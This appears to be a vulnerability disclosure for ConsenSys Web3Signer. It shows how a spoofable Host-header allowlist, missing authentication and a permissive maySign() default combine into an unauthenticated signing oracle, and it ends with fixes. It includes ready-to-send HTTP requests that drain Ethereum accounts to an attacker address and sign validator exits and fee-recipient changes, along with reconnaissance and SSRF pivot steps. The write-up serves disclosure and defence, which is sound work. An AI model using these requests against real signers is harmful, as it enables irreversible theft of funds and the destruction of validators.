# Web3Signer: Signing Oracle via Three Chained Gaps — Total Asset Compromise

**Target:** ConsenSys Web3Signer (HEAD `d8ea31d`)

---

## What This Is

Three gaps in the codebase chain together to give any network-reachable attacker an **unrestricted signing oracle** — functionally identical to stealing every private key the signer holds. The attacker can sign anything, with any key, unlimited times, with no credential.

This is not about one endpoint or one missing check. It's about how three individually-incomplete weaknesses combine to give the attacker the **signing function itself**, and what that function controls.

---

## Gap 0: How the Attacker Reaches Web3Signer

Web3Signer is an internal service — not meant to be internet-facing. The attacker must first get TCP connectivity to port 9000. This is the hardest part of the chain and the most overlooked.

### The Official Docker Image Ships Bound to 0.0.0.0

`docker/Dockerfile:32-33`:
```dockerfile
ENV WEB3SIGNER_HTTP_LISTEN_HOST="0.0.0.0" \
    WEB3SIGNER_METRICS_HOST="0.0.0.0"
```

The Java code defaults to `localhost`. But the **official Docker image overrides this to `0.0.0.0`** via environment variable. Every container deployment using the official image already listens on all interfaces. This is not operator misconfiguration — it's the shipped default. The operator would have to actively override it back to `127.0.0.1`, which breaks container networking (the port wouldn't be reachable from outside the container, defeating the purpose of running it in Docker/k8s).

This means the question isn't "is it bound to 0.0.0.0?" — it almost certainly is. The question is: **can anyone route a packet to it?**

### Realistic Attack Vectors to Reach Port 9000

**Vector 1: Kubernetes / cloud networking misconfiguration (most common)**

The typical staking stack in k8s is:
```
[beacon node] → [web3signer:9000] → [vault / keystores]
                      ↓
              [postgresql:5432] (slashing protection)
```

All pods in the same namespace can reach each other by default — k8s has no network isolation unless someone explicitly creates a `NetworkPolicy`. Most operators don't. If the attacker compromises ANY pod in the same namespace (or cluster, if no namespace isolation exists), they can reach web3signer:9000 directly. That "any pod" could be:
- A monitoring agent (Prometheus exporters, Datadog, etc.)
- A log shipper (Fluentd, Filebeat)
- A webhook handler
- A CI/CD runner
- Any sidecar container

Additionally, common misconfigurations that expose 9000 directly to the internet:
- `Service type: LoadBalancer` instead of `ClusterIP`
- `NodePort` service on all cluster nodes
- Ingress controller with a wildcard route
- Cloud security group allowing 9000 from 0.0.0.0/0

**Vector 2: SSRF from an adjacent service**

The attacker doesn't need to reach Web3Signer directly. They need to reach any service that CAN reach Web3Signer. The monitoring stack is the most common entry point:

- **Grafana** (known SSRF vulnerabilities: CVE-2020-13379, etc.) — if the operator's Grafana can reach Web3Signer's network, an SSRF through Grafana becomes a signing oracle
- **Prometheus** — if Prometheus is configured to scrape Web3Signer metrics (port 9001, also bound to 0.0.0.0 per the Dockerfile), the attacker knows the internal IP/hostname from the Prometheus targets page
- **Beacon node REST API** — beacon nodes expose REST APIs and have larger attack surfaces due to p2p networking; if the beacon node is compromised, it sits right next to Web3Signer on the network
- **Any webhook/notification endpoint** in the staking stack that processes external input

The attack: find SSRF in Grafana/monitoring → send requests to `http://web3signer:9000/api/v1/eth2/sign/...` through the SSRF → get signatures back.

**Vector 3: Metrics endpoint leaks the target (port 9001)**

Web3Signer's metrics port (9001, also bound to `0.0.0.0`) is often scraped by external monitoring. The metrics themselves are not sensitive, so operators often leave them more accessible. But the metrics response confirms the service exists, and the Prometheus target config reveals the internal hostname/IP of the signing service. Even if 9001 is reachable but 9000 isn't, the attacker now knows exactly where to aim an SSRF.

**Vector 4: Lateral movement from beacon node p2p**

The beacon node has a large attack surface: it participates in a p2p network, receives blocks and attestations from untrusted peers, and parses complex SSZ-encoded data. A vulnerability in the beacon node (memory corruption in SSZ parsing, malicious peer protocol handling) gives the attacker code execution on the beacon node host — which sits directly adjacent to Web3Signer on the internal network.

**Vector 5: Cloud VPC / shared network**

In cloud deployments (AWS, GCP, Azure), staking infrastructure often runs in a VPC alongside other workloads. The attacker compromises any other workload in the VPC (a public-facing web app, an API server, a bastion host with weak credentials). From there, they can route to Web3Signer's internal IP on port 9000. VPC security groups frequently allow all internal traffic.

**Vector 6: Supply chain — malicious dependency or image**

A compromised NPM/Maven/Docker dependency in ANY component of the staking stack (not just Web3Signer itself) can include code that reaches out to Web3Signer on the internal network. The malicious code runs inside the network perimeter, has direct access to internal DNS, and can resolve `web3signer` to its cluster IP.

### The Attacker's Recon Sequence

1. **Scan public infrastructure** — Shodan/Censys for port 9000 with `/upcheck` response. Also scan for Grafana (3000), Prometheus (9090), beacon nodes (5052) which reveal the staking stack exists.

2. **Pivot from accessible component** — Find the weakest link in the stack. Grafana dashboards, beacon node APIs, and monitoring endpoints are typically more exposed than the signer itself.

3. **Discover internal topology** — From the compromised component, resolve internal DNS (`web3signer`, `web3signer.staking.svc.cluster.local`), read Prometheus target configs, or scan the local /16 for port 9000.

4. **Confirm signing oracle** — One HTTP request: `curl -H "Host: localhost" http://<internal-ip>:9000/upcheck` → "OK". The chain begins.

---

## The Three Gaps

### Gap 1: Host Header Is the Only Gate, and It's Client-Controlled

`HostAllowListHandler.java:50-52`:
```java
private Optional<String> getAndValidateHostHeader(final RoutingContext event) {
    final HostAndPort hostAndPort = event.request().authority();   // reads HTTP "Host:" header
    return Optional.ofNullable(hostAndPort).map(HostAndPort::host);
}
```

This reads `event.request().authority()` — the HTTP `Host` header — which is a value the **client** sets. It never calls `event.request().remoteAddress()`. The default allowlist is `["localhost","127.0.0.1"]` (`Web3SignerBaseCommand.java:142`). Any client from any IP sets `Host: localhost` and passes.

### Gap 2: Nothing After the Gate

`Runner.java:128-155` — the Vert.x router chain is:

```
AccessLog -> CorsHandler -> HostAllowListHandler -> BodyHandler -> [route handlers]
```

No `AuthHandler`. No `BearerAuthHandler`. No JWT validation. No API key check. The OpenAPI spec at `openapi-specs/eth2/keymanager/schemas.yaml:2-6` declares `bearerAuth: JWT` — **no code implements it**. After the Host header passes, every request reaches the handler with full trust.

### Gap 3: Slashing Protection Is Scoped Wrong

`Eth2SignForIdentifierHandler.java:169-200`:
```java
private boolean maySign(...) {
    switch (eth2SigningRequestBody.type()) {
      case BLOCK, BLOCK_V2 -> { /* DB check */ }
      case ATTESTATION     -> { /* DB check */ }
      default -> { return true; }          // 10 of 13 types pass unconditionally
    }
}
```

Slashing protection guards against protocol-level slashing (double blocks, surround votes). It treats everything else as "safe to sign." But `VOLUNTARY_EXIT` is irreversible. `VALIDATOR_REGISTRATION` controls where money goes. `DEPOSIT` controls withdrawal credentials. None of these are "slashable," but all are destructive. The design conflates "not slashable" with "safe."

---

## What the Signing Oracle Means — Concretely

Gaps 1+2+3 give the attacker a function: **sign(key, data) -> signature**, for any key loaded in Web3Signer, with any data, unlimited times.

This is not theoretical. Here is what that function controls in each deployment mode:

---

### Eth1 Mode: Immediate, Complete Fund Theft

In Eth1 mode, Web3Signer acts as a signing proxy in front of a Besu node. It handles `eth_sendTransaction` — which **signs AND broadcasts** the transaction to the network in a single call.

**Code path:**

```
JsonRpcRoute.java:94-100
  -> route(POST, "/")
  -> JsonRpcHandler
      -> RequestMapper.java dispatch
          -> "eth_sendTransaction" -> SendTransactionHandler.java:58

SendTransactionHandler.java:58-86
  :62 -> transactionFactory.createTransaction(context, request)
          -> Transaction object: from=VICTIM, to=ATTACKER, value=ALL_ETH
  :78 -> secpSigner.isSignerAvailable(victim_address) -> true (key is loaded)
  :85 -> sendTransaction(transaction, context, secpSigner, request)

  -> TransactionSerializer.java:43-51
      :98-102 -> secpSigner.sign(victim_address, bytesToSign) -> Secp256k1 signature
                 (SignerForIdentifier.java:42 -> real private key signs)

  -> TransactionTransmitter.java:58-71
      :59 -> createSignedTransactionPayload() -> RLP-encoded signed transaction
      :66 -> sendTransaction(Json.encode(request))

  -> TransactionTransmitter.java:112-117
      :116 -> transmitter.sendRequest(method, headers, path, bodyContent)
               -> VertxRequestTransmitter forwards to downstream Besu node
               -> Besu broadcasts to Ethereum network
               -> Transaction is mined
               -> Funds are transferred
```

**Attacker sends:**
```http
POST / HTTP/1.1
Host: localhost
Content-Type: application/json

{"jsonrpc":"2.0","method":"eth_sendTransaction",
 "params":[{"from":"0xVICTIM_ADDRESS","to":"0xATTACKER_ADDRESS",
            "value":"0xDE0B6B3A7640000"}],"id":1}
```

**What happens on-chain:** The signed transaction is broadcast. The ETH moves from victim to attacker. It is mined into a block. The transfer is final.

The attacker doesn't even need to know the victim's balance first — they call `eth_accounts` (also unauthenticated, `JsonRpcRoute.java:131-135`) to enumerate all loaded addresses, then drain each one. Web3Signer helpfully auto-fills the nonce via `RetryingTransactionTransmitter` (line 110-115) which retries with incremented nonces up to 10 times if nonce is too low.

**Additionally** — `PassThroughHandler` (`JsonRpcRoute.java:103-107`) forwards **every unrecognized JSON-RPC method** to the internal Besu node:

```java
// JsonRpcRoute.java:103-107
context.getRouter().route()
    .handler(BodyHandler.create())
    .handler(new PassThroughHandler(transmitterFactory, JSON_DECODER));
```

```java
// PassThroughHandler.java:56-62
final VertxRequestTransmitter transmitter =
    transmitterFactory.create(new ForwardedMessageResponder(context));
transmitter.sendRequest(request.method(), headersToSend, request.path(),
    context.body().asString());   // forwards ANYTHING to Besu
```

This gives the attacker an open SSRF proxy to the internal Besu node — `admin_peers`, `debug_traceTransaction`, `txpool_content`, `miner_setEtherbase` — whatever the downstream node exposes. APIs that are never meant to be externally reachable become externally reachable through Web3Signer.

**Eth1 bottom line:** The attacker drains every account, immediately, irreversibly. Plus full proxy access to the internal Besu node.

---

### Eth2 Mode: Permanent Validator Destruction + Revenue Theft

#### Attack A: Force-Exit Every Validator (Irreversible On-Chain)

```
POST /api/v1/eth2/sign/0x<PUBKEY> HTTP/1.1
Host: localhost

{"type":"VOLUNTARY_EXIT",
 "fork_info":{"fork":{"previous_version":"0x04000000",
   "current_version":"0x05000000","epoch":"269568"},
   "genesis_validators_root":"0x4b363db94e..."},
 "voluntary_exit":{"epoch":"269568","validator_index":"12345"}}
```

All inputs are public blockchain data. Code path through `Eth2SignForIdentifierHandler.java`:
- `:94` — parse body, type = `VOLUNTARY_EXIT`
- `:100` -> `computeSigningRoot()` -> `:271-274` — compute root from epoch + validator_index + fork
- `:133-134` — `signerForIdentifier.sign()` — **BLS signature produced with real private key**
- `:150` -> `maySign()` -> `:196-197` — `default -> return true` — **no check**
- `:152` — `respondWithSignature()` — **signature returned to attacker**

Attacker broadcasts `SignedVoluntaryExit` to any beacon node. The beacon chain verifies the BLS signature (valid — signed by the real key). The validator enters the exit queue. After 256 epochs (~27 hours), it is **permanently removed from the active set**. There is no on-chain mechanism to cancel a voluntary exit. Ever. The staked 32 ETH is locked until the withdrawal epoch.

For N validators: N x 32 ETH of staked capital becomes illiquid. All future consensus rewards are permanently forfeited. The operator must re-deposit with entirely new keys and wait through the activation queue (weeks to months).

#### Attack B: Redirect All Revenue (Stealth, Ongoing)

```
POST /api/v1/eth2/sign/0x<PUBKEY> HTTP/1.1
Host: localhost

{"type":"VALIDATOR_REGISTRATION",
 "validator_registration":{"fee_recipient":"0xATTACKER_ADDRESS",
   "gas_limit":"30000000","timestamp":"1707436800",
   "pubkey":"0x<SAME_PUBKEY>"}}
```

Same code path. `VALIDATOR_REGISTRATION` -> `computeSigningRoot()` at `:316-320` (doesn't even need fork_info). Signs. `maySign()` -> `default -> return true`. Signature returned.

Attacker submits signed registration to MEV relays. Relays verify signature against on-chain pubkey (valid). All future blocks built by relays for this validator send priority fees + MEV to `0xATTACKER`. The operator sees nothing wrong — the validator keeps attesting and proposing normally. Money silently flows to the attacker until someone manually audits fee recipient registrations across all relays.

#### Attack C: Deny Consensus Participation (Ongoing Penalties)

The attacker can **race** the legitimate beacon node's signing requests. If the attacker signs a block at slot X before the beacon node does, slashing protection records the attacker's version. When the legitimate beacon node requests a signature for its block at slot X, `maySignBlock()` returns false (slot already signed). The validator misses its proposal. Repeat for attestations (sign a valid attestation at each epoch before the beacon node does). The validator incurs inactivity penalties and loses ETH through missed duties, even without being exited.

---

## Combined Impact — This Is Total Compromise

The signing oracle is **functionally identical to possessing all private keys**. The distinction between "signing access" and "key theft" doesn't matter when:

- There is no rate limit (sign unlimited times)
- There is no type restriction (sign anything — transactions, exits, registrations, blocks, deposits)
- There is no revocation mechanism (the oracle works as long as the process runs)
- There is no audit alerting (signing operations log at TRACE/DEBUG only)

| Mode | What Happens | Is It Reversible? |
|------|-------------|-------------------|
| **Eth1** | Every ETH balance drained from every loaded Secp256k1 account via `eth_sendTransaction` | **No.** Transactions are final once mined. |
| **Eth1** | Full SSRF proxy to internal Besu node (admin/debug/txpool APIs) | Depends on downstream exposure. |
| **Eth2** | Every validator permanently force-exited via `VOLUNTARY_EXIT` | **No.** Exits are irreversible on-chain. |
| **Eth2** | All MEV + priority fee revenue redirected via `VALIDATOR_REGISTRATION` | Revenue lost during theft window is gone. |
| **Eth2** | Legitimate proposals/attestations blocked by racing, causing inactivity leak | Stops when attacker stops, but penalties already incurred. |

For a staking operation with 1,000 validators and associated Eth1 accounts: every account is drained, every validator is permanently exited, and all MEV revenue is redirected — simultaneously, in minutes, with no credentials.

---

## Exact Code Path (Eth1 — Direct Fund Theft)

```
HTTP POST / {"jsonrpc":"2.0","method":"eth_sendTransaction","params":[...]}
|
+- Runner.java:143 -- HostAllowListHandler
|   +- :36-37 -- Host="localhost" -> allowlist match -> event.next()
|       (NO remoteAddress check. NO auth layer follows.)
|
+- JsonRpcRoute.java:94-100 -- route(POST, "/")
|   +- JsonRpcHandler -> RequestMapper -> "eth_sendTransaction"
|       +- SendTransactionHandler.java:58 -- handle()
|           |
|           +- :62 -- transactionFactory.createTransaction()
|           |         from = 0xVICTIM, to = 0xATTACKER, value = all ETH
|           |
|           +- :78 -- secpSigner.isSignerAvailable(victim) -> true
|           |
|           +- :85 -- sendTransaction()
|               |
|               +- TransactionSerializer.java:98-102
|               |   +- secpSigner.sign(victim_address, txBytes)
|               |       +- SignerForIdentifier.java:42
|               |           +- signerProvider.getSigner(victim)
|               |               +- EthSecpArtifactSigner.sign(data) <<< REAL PRIVATE KEY SIGNS
|               |
|               +- TransactionTransmitter.java:112-117
|                   +- transmitter.sendRequest(POST, headers, "/", signedTxJson)
|                       +- VertxRequestTransmitter.java:70-79
|                           +- downStreamConnection.request(POST, "/")
|                               +- request.end(signedTxBody)
|                                   +- Besu receives eth_sendRawTransaction
|                                       +- Transaction broadcast to Ethereum p2p network
|                                           +- Mined into block
|                                               +- ETH transferred to attacker <<< DONE
```

---

## What Breaks the Chain

Any one of these kills it:

1. **Authentication** — Bearer token, mTLS, or API key validation in the router chain before any handler. Cost: one middleware addition in `Runner.java`. The attacker is stopped before reaching any route. This is the minimal fix and it kills the chain for both Eth1 and Eth2 modes.

2. **Source IP validation** — Replace `event.request().authority()` with `event.request().remoteAddress()` in `HostAllowListHandler`. The attacker can no longer bypass the allowlist by spoofing a header.

3. **Default-deny in maySign()** — Change `default -> return true` to `default -> return false`. At minimum, add explicit deny for `VOLUNTARY_EXIT` and `VALIDATOR_REGISTRATION`. This only helps Eth2 mode; Eth1 has no equivalent concept — there is nothing between the signing function and fund transfer.

The minimal fix is #1. Currently all three gaps co-exist, and the path from TCP connect to total asset drainage is unbroken.
